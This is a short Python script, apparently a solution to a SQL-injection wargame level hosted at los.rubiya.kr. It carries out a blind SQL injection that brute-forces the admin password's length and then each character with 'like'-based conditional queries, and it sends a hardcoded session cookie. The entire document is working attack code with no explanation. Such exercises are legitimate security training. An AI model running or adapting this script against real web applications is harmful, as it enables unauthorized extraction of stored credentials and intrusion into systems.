from urllib.request import urlopen
import urllib
import requests

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php?"
session = dict(PHPSESSID = "0jtlu4osislbgbgslno5s4iafp")

print ("! Start")

print ("! Find length of the password")

for i in range(0, 20):
	try:
		query = f"{url}no=1 or id like char(0x61, 0x64, 0x6d, 0x69, 0x6e) and length(pw) like {i}%23"
		r = requests.post(query, cookies=session)
	except:
		print ("! Error")
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print ("! Found length : ", length)

print ("! Find password")

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = f"{url}no=1 or id like char(0x61, 0x64, 0x6d, 0x69, 0x6e) and ord(mid(pw,{j}, 1)) like {i}"
			r = requests.post(query, cookies=session)
		except:
			print ("! Error")
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print ("! pw " + str(j), ":", flag)
			break

print ("! Found pw : ", flag)
print ("! End")
